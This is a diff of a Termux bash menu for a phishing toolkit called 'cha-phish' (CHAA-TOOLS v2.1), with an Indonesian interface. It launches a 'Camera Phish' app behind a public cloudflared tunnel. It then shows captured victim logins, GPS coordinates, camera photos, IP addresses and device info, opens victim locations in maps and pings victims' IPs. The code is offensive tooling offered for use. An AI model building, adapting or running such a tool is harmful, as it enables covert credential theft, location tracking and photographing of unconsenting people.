@@ -1,4 +1,4 @@
-#!/usr/bin/env bash
+#!/data/data/com.termux/files/usr/bin/bash
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -48,9 +48,9 @@ show_menu() {
             echo -e "${YELLOW}🔥 Memulai Camera Phish...${NC}"
             echo -e "${YELLOW}⏳ Mohon tunggu...${NC}"
             echo -e "${YELLOW}📌 Tekan ${GREEN}ENTER${YELLOW} untuk kembali ke menu${NC}"
-            cd "/c/Users/GG/cha-phish/ai mamb" && python app.py > /dev/null 2>&1 &
+            cd ~/cha-phish/"ai mamb" && python app.py > /dev/null 2>&1 &
             sleep 4
-            ./cloudflared.exe tunnel --url http://localhost:8080 2>&1 | grep -o 'https://[^ ]*\.trycloudflare\.com' &
+            cloudflared tunnel --url http://localhost:8080 2>&1 | grep -o 'https://[^ ]*\.trycloudflare\.com' &
             CLOUD_PID=$!
             read -p ""
             echo -e "\n${YELLOW}⏹ Menghentikan tunnel...${NC}"
@@ -60,7 +60,7 @@ show_menu() {
             ;;
         2)
             echo -e "${GREEN}▶ CEK HASIL${NC}"
-            cd "/c/Users/GG/cha-phish/ai mamb/captured"
+            cd ~/cha-phish/"ai mamb"/captured
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
             echo -e "${YELLOW}📊 DATA LOGIN + GPS${NC}"
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
@@ -76,7 +76,7 @@ show_menu() {
             ;;
         3)
             echo -e "${GREEN}▶ BUKA + COPY FOTO${NC}"
-            cd "/c/Users/GG/cha-phish/ai mamb/captured/images"
+            cd ~/cha-phish/"ai mamb"/captured/images
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
             echo -e "${YELLOW}📸 DAFTAR FOTO${NC}"
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
@@ -84,10 +84,9 @@ show_menu() {
             echo ""
             read -p "Masukkan nama file foto: " foto
             if [ -f "$foto" ]; then
-                start "$foto" 2>/dev/null
-                mkdir -p "/c/Users/GG/Pictures/cha-phish"
-                cp "$foto" "/c/Users/GG/Pictures/cha-phish/" 2>/dev/null
-                echo -e "${GREEN}✅ Foto dibuka & disalin ke Pictures/cha-phish!${NC}"
+                termux-open "$foto" 2>/dev/null
+                cp "$foto" /sdcard/DCIM/Camera/ 2>/dev/null
+                echo -e "${GREEN}✅ Foto dibuka & disalin ke galeri!${NC}"
             else
                 echo -e "${RED}❌ File tidak ditemukan!${NC}"
             fi
@@ -96,11 +95,11 @@ show_menu() {
             ;;
         4)
             echo -e "${GREEN}▶ BUKA LOKASI TARGET DI MAPS${NC}"
-            cd "/c/Users/GG/cha-phish/ai mamb/captured"
+            cd ~/cha-phish/"ai mamb"/captured
             COORD=$(grep -oE 'GPS    : [0-9.-]+, [0-9.-]+' data.txt 2>/dev/null | tail -1 | sed 's/GPS    : //')
             if [ -n "$COORD" ]; then
                 echo -e "${YELLOW}📍 Buka maps: $COORD${NC}"
-                start "https://maps.google.com/?q=$COORD"
+                termux-open "https://maps.google.com/?q=$COORD"
             else
                 echo -e "${RED}❌ Belum ada GPS target!${NC}"
             fi
@@ -109,7 +108,7 @@ show_menu() {
             ;;
         5)
             echo -e "${GREEN}▶ CEK KONEKSI TARGET${NC}"
-            cd "/c/Users/GG/cha-phish/ai mamb/captured"
+            cd ~/cha-phish/"ai mamb"/captured
             IP=$(grep -oE 'IP     : [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' data.txt 2>/dev/null | tail -1 | awk '{print $3}')
             if [ -n "$IP" ]; then
                 echo -e "${YELLOW}📍 Ping ke $IP ...${NC}"
@@ -130,7 +129,7 @@ show_menu() {
             ;;
         7)
             echo -e "${GREEN}▶ CEK DEVICE INFO TARGET${NC}"
-            cd "/c/Users/GG/cha-phish/ai mamb/captured"
+            cd ~/cha-phish/"ai mamb"/captured
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
             echo -e "${YELLOW}📱 DEVICE INFO TARGET${NC}"
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
@@ -188,7 +187,7 @@ show_menu() {
                 echo -e "${GREEN}➤ Buka Google Maps? (y/n)${NC}"
                 read -p "Pilihan: " open_map
                 if [[ "$open_map" == "y" || "$open_map" == "Y" ]]; then
-                    start "https://maps.google.com/?q=$lat,$lon"
+                    termux-open "https://maps.google.com/?q=$lat,$lon"
                 fi
             fi
             read -p "Tekan Enter untuk kembali..."
@@ -222,11 +221,11 @@ echo -e "${CYAN}    ╚██████╗██║  ██║██║  █�
 echo -e "${CYAN}     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚══════╝╚══════╝${NC}"
 echo ""
 echo -e "${CYAN}╔════════════════════════════════════════════════════╗${NC}"
-echo -e "${CYAN}║${NC}    ${YELLOW}⚡ CHAA-TOOLS v2.1 ⚡${NC}${CYAN}║${NC}"
+echo -e "${CYAN}║${NC}       ${YELLOW}⚡ CHAA-TOOLS v2.1 ⚡${NC}                       ${CYAN}║${NC}"
 echo -e "${CYAN}╠════════════════════════════════════════════════════╣${NC}"
-echo -e "${CYAN}║${NC}  ${WHITE}Author   : nzm${NC}           ${CYAN}║${NC}"
-echo -e "${CYAN}║${NC}  ${WHITE}Version  : 2.1${NC}           ${CYAN}║${NC}"
-echo -e "${CYAN}║${NC}  ${WHITE}Status   : ${GREEN}DEV${NC}   ${CYAN}║${NC}"
+echo -e "${CYAN}║${NC}  ${WHITE}Author   : nzm${NC}                                   ${CYAN}║${NC}"
+echo -e "${CYAN}║${NC}  ${WHITE}Version  : 2.1${NC}                                   ${CYAN}║${NC}"
+echo -e "${CYAN}║${NC}  ${WHITE}Status   : ${GREEN}DEVELOPER${NC}                             ${CYAN}║${NC}"
 echo -e "${CYAN}╚════════════════════════════════════════════════════╝${NC}"
 echo ""
 echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
